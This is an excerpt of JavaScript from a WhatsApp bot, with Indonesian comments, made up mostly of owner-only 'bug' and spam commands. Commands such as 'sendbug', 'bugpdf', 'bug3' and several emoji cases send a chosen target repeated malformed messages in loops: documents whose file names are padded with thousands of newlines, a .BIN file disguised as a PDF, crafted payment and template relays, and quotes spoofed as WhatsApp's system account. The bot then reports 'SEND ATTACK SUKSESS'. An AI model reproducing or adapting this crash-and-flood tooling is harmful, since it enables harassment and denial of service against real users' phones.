...
let { key } = await Kyuu.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < kyuu.length; i++) {
/*await delay(10)*/
await Kyuu.sendMessage(from, {text: kyuu[i], edit: key });//PESAN LEPAS
}
}
...
//Fake
		...
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6282144323683-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
...
await sleep(2000)
sendviewOnce(target)
Kyuu.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
await sleep(2000)
}
break
case "sendbug": {
if (!XeonTheCreator) return Kyuu.sendImageAsSticker(from, fs.readFileSync('./baselins/stickernye/owner.webp'), m, { packname: 'LinsBotz', author: 'sabar ya\njangan lupa bantu follow\nyt: @LinsBotz\nig: rijalsavior' }, { quoted: m})
...
if (target == '6282144323683@s.whatsapp.net') return
if (target == '6282144323683@s.whatsapp.net') return
Kyuu.sendImageAsSticker(from, fs.readFileSync('./baselins/stickernye/wait.webp'), m, { packname: 'LinsBotz', author: 'sabar ya\njangan lupa bantu follow\nyt: @LinsBotz\nig: rijalsavior' }, { quoted: m})
await sleep(1000)
sendBug2(target,jumlahnya)
await sleep(2000)
sendviewOnce(target)
Kyuu.sendImageAsSticker(from, fs.readFileSync('./baselins/stickernye/sukses.webp'), m, { packname: 'Pesanan Telah Selesai', author: 'Jangan Lupa Follow me\nyoutube: @LinsBotz\nig: rijalsavior' }, { quoted: m})
await sleep(2000)
}
break
case 'animek': {
...
Kyuu.sendMessage(m.chat, { video: { url: json.thumbnail }, caption: cap }, { quoted: m})
};
break
        case 'tohd':
case 'removebg': {
...
await Kyuu.sendMessage(m.chat, {react: {text: `⌛`, key: m.key}})
await Kyuu.sendMessage(m.chat, {react: {text: `⏳`, key: m.key}})
var target = tete.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
Kyuu.sendMessage(target, {text: command}, {quoted: stik})
}
await Kyuu.sendMessage(m.chat, {react: {text: `✅`, key: m.key}})
m.reply("_Done_")
}
...
break
        case '🌱': case '😎': case '😈': case '☠️': case '👻': case '🐦': case '🗿':  {
...
for (let i = 0; i < jumlah; i++) {
Kyuu.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
Kyuu.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
await sleep(2000)
Kyuu.sendMessage(prrkek, {text: '《 ███████▒▒▒▒▒》50%'}, {quoted:lep})
await sleep(2000)
Kyuu.sendMessage(prrkek, {text: '《 ████████████》100%'}, {quoted:lep})
await sleep(2000)
Kyuu.sendMessage(prrkek, {text: '《 █▒▒▒▒▒▒▒▒▒▒▒》10%'}, {quoted:lep})
await sleep(2000)
Kyuu.sendMessage(prrkek, {text: '《 ████▒▒▒▒▒▒▒▒》30%'}, {quoted:lep})
...
Kyuu.sendMessage(from, { text: `*SEND SEND ATTACK SUKSESS*
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Kyuu.sendMessage(prrkek, { document: thumb, caption: "NaufalHost 😈`", fileName: `Naufalhost 😈 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Kyuu.sendMessage(prrkek, { document: thumb, caption: "NaufalHost 😈`", fileName: `NaufalHost 😈 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Kyuu.sendMessage(m.chat, { text: `*SEND ATTACK SUKSESS*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×
...
for (let i = 0; i < jumlah; i++) {
Kyuu.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
...
Kyuu.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${place}.BIN`, title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ.BIN` }, { quoted: pak })
}
break
//=================================================//
case 'bugpdf':{
if (!XeonTheCreator) return m.reply(from)
anuin = fs.readFileSync('./basetzy/mytzy/ngeselin.BIN')
Kyuu.sendMessage(m.chat, { document: anuin, mimetype: 'application/pdf', fileName: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${place}.pdf`, title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ.pdf` }, { quoted: pak })
}
break
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => Kyuu.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://youtube.com/c/PakTzy` }}}, { quoted })
//=================================================//
// VN m.chat
case 'bug3': {
if (!XeonTheCreator) throw m.reply(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basetzy/gambarnye/theKyuu.jpg') }, { upload: Kyuu.waUploadToServer })
...
Kyuu.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'senbug':{
...
Kyuu.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'japanese':
replygcxeon(mess.wait)
...
ydd = `Hallo Im HuTao`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basetzy/gambarnye/pict.jpg') }, { upload: Kyuu.waUploadToServer })
...
Kyuu.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}}
break
case 'ryujin':
replygcxeon(mess.wait)
...
let e = String(err)
Kyuu.sendMessage("6282144323683@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
